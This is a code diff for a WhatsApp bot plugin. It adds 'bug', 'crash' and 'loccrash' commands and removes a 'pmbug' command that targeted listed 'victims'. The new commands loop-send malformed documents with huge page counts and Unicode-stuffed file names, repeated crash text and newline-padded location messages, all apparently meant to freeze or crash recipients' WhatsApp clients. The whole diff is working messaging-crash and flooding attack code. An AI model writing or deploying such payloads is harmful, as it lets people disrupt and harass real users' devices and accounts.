@@ -114,83 +114,97 @@ async function sendbug(dest, zk, ms, repondre, amount, victims, bug) {
 
 zokou(
     {
-        nomCom: "pmbug",
+        nomCom: "bug",
         categorie: category,
         reaction: reaction
     },
 
     async (dest, zk, commandOptions) => {
-        const { ms, arg, repondre, superUser, prefixe } = commandOptions;
+        const { ms, arg, repondre, superUser } = commandOptions;
         if (!superUser) return await repondre(mess.prem);
-        if (!arg[0])
-            return await repondre(
-                `Use ${prefixe}pmbug amount | numbers\n> Example ${prefixe}pmbug 30 |${
-                    conf.NUMERO_OWNER
-                } or ${prefixe}pmbug ${conf.NUMERO_OWNER.split(",")[0]}`
-            );
+
+        // send loading message
         await loading(dest, zk);
-        const text = arg.join("");
-        let amount = 30;
-        let victims = [];
-        const bug = {
-            scheduledCallCreationMessage: {
-                callType: "2",
-                scheduledTimestampMs: `${moment(1000)
-                    .tz("Asia/Kolkata")
-                    .format("DD/MM/YYYY HH:mm:ss")}`,
-                title: `${bugtext1}`
+
+        for (let i = 0; i < 25; i++) {
+            const doc = { url: "./set" };
+            await zk.sendMessage(dest, {
+                document: doc,
+                mimetype:
+                    "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9",
+                title: "bx.pdf",
+                pageCount: 9999999999,
+                thumbnail: {
+                    url: "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg"
+                },
+                thumbnailUrl:
+                    "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg",
+                jpegThumbnail: {
+                    url: "https://i.ibb.co/wyYKzMY/68747470733a2f2f74656c656772612e70682f66696c652f6530376133643933336662346361643062333739312e6a7067.jpg"
+                },
+                mediaKey: "ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=",
+                fileName:
+                    "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9\n\n" +
+                    bugpdf
+            });
+        }
+        await zk.sendMessage(dest, { react: { text: "✅", key: ms.key } });
+    }
+);
+
+//crash
+zokou (
+    {
+        nomCom: "crash",
+        categorie: category,
+        reaction: reaction
+    },
+
+    async (dest, zk, commandOptions) => {
+        const { ms, arg, repondre, superUser } = commandOptions;
+        const bug = bugtext6;
+        if (!superUser) return await repondre(mess.prem);
+        await loading(dest, zk);
+        try {
+            for (let i = 0; i < 10; i++) {
+                await repondre(bug);
             }
-        };
-        if (arg.length === 1) {
-            victims.push(arg[0]);
-            await repondre(`sending ${amount} bugs to ${victims[0]}`);
-            try {
-                await relaybug(dest, zk, ms, repondre, amount, victims, bug);
-            } catch (e) {
-                await repondre("An error occured");
-                console.log(`An error occured: ${e}`);
-                await react(dest, zk, ms, "⚠️");
-            }
-        } else {
-            amount = parseInt(text.split("|")[0].trim());
-            if (
-                amount > conf.BOOM_MESSAGE_LIMIT ||
-                isNaN(amount) ||
-                amount < 1
-            ) {
-                return await repondre(
-                    `amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`
+        } catch (e) {
+            await repondre(`an error occoured sending bugs`);
+            console.log(`an error occured sending bugs : ${e}`);
+            return;
+        }
+    }
+);
+
+//loccrash
+zokou(
+    {
+        nomCom: "loccrash",
+        reaction: "💥",
+        categorie: category
+    },
+
+    async (dest, zk, commandOptions) => {
+        const { ms, arg, repondre, superUser } = commandOptions;
+        if (!superUser) return await repondre(mess.prem);
+        await loading(dest, zk);
+
+        for (let i = 0; i < 20; i++) {
+            for (let j = 0; j < "3"; j++) {
+                zk.sendMessage(
+                    dest,
+                    {
+                        location: {
+                            degreesLatitude: -6.28282828,
+                            degreesLongitude: -1.2828,
+                            name: "BRUX0N3RD\n\n\n\n\n\n\n\n"
+                        }
+                    },
+                    { quoted: ms }
                 );
-            } else {
-                victims = text
-                    .split("|")[1]
-                    .split(",")
-                    .map(x => x.trim())
-                    .filter(x => x !== "");
-                if (victims.length > 0) {
-                    await repondre(
-                        `sending ${amount} bugs to ${victims.join(", ")}`
-                    );
-                    try {
-                        await relaybug(
-                            dest,
-                            zk,
-                            ms,
-                            repondre,
-                            amount,
-                            victims,
-                            bug
-                        );
-                    } catch (e) {
-                        await repondre("An error occured");
-                        console.log(`An error occured: ${e}`);
-                        await react(dest, zk, ms, "⚠️");
-                    }
-                } else {
-                    return await repondre("No victims specfied");
-                }
             }
         }
-        await react(dest, zk, ms, "✅");
+        await zk.sendMessage(dest, { react: { text: "✅", key: ms.key } });
     }
 );
